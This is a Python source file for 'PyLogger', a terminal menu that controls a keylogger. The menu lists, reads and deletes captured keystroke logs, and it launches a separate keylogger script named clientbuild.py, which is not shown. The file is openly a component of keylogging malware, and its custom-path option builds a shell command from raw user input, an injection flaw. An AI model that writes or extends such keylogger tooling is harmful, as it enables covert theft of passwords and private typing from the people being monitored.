import os
import time
import shutil

while True:
    os.system('clear')
    print("""
    ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓█▓▒▒▓███▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░  
    ░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
          by: Confetti
                                                                                                             
    """)
    print("[1] List last Keylogs.txt")
    print("[2] Activate Keylogger [root necessary]")
    print("[3] DELETE ALL LOGS [root necessary]")
    print("[4] Read a log File")
    try:
        opt = str(input("Choose a option for your PyLogger: \n"))
        match opt:
            case "1":
                print("[1] List last Keylogs.txt [selected]")
                if os.path.exists("logs"):
                    print("----------------------")
                    print("")
                    for file in os.listdir("logs"):
                        if file.endswith('.txt'):
                            print(file)
                else:
                    print("ERROR: File NOT found")
                print("")
                print("----------------------")
                input("Press enter to continue")
            case "2":
                print("[2] Activate Keylogger [selected]")
                print("")
                pathK = str(input("Path of the Keylogger \n[1] Use common path\n[2] Inform the path where the keylogger is located\n>>> "))
                match pathK:
                    #Using Normal Path
                    case "1":
                        print("")
                        print("Using normal path")
                        os.popen("python clientbuild.py")
                        try:
                            input("Use CTRL + C to kill keylogger")
                        except KeyboardInterrupt:
                            break
                    #Using Custom Path
                    case "2":
                        print("")
                        print("Please insert the path: ")
                        pathV = str(input("Paste here -> "))
                        Crun = "python " + pathV + "/clientbuild.py"
                        os.popen(Crun)
                        input("Use CTRL + C to kill keylogger")
                        try:
                            input("Use CTRL + C to kill keylogger")
                        except KeyboardInterrupt:
                            break
            case "3":
                print("[3] DELETE ALL LOGS [selected]")
                print("")
                print("are you sure that you want to delete ALL files and logs inside of the folder Logs?")
                cho = str(input("[y][N]: "))
                match cho.upper():
                    case "Y":
                        print("----Deleting all files from log-------")
                        shutil.rmtree('logs')
                        os.mkdir('logs')
                    case "N":
                        print("----Stoping exclusion process-------")
                    case _:
                        print("----Stoping exclusion process-------")
                time.sleep(3)
            case "4":
                print("[4] Read a log File [selected]")
                print("")
                print("------------------------------")
                j = 0
                ldir = []
                for i in os.listdir('logs'):

                    print(f"[{j}] {i}")
                    ldir.append(i)
                    j += 1
                if j == 0:
                    print("There's no file to be read")
                    time.sleep(5)
                else:

                    optDir = int(input("Choose witch file you wanna read: "))
                    fileto = "logs/" + ldir[optDir]
                    with open(fileto, 'r') as f:
                        print(f.readlines())
                    print("")
                    input("Press enter to continue")
                
            case _:
                print("!! Sorry this is not a Option !!")
                time.sleep(2)
    except KeyboardInterrupt:
        print("")
        print("Keyboard Interrupted, closing")
        break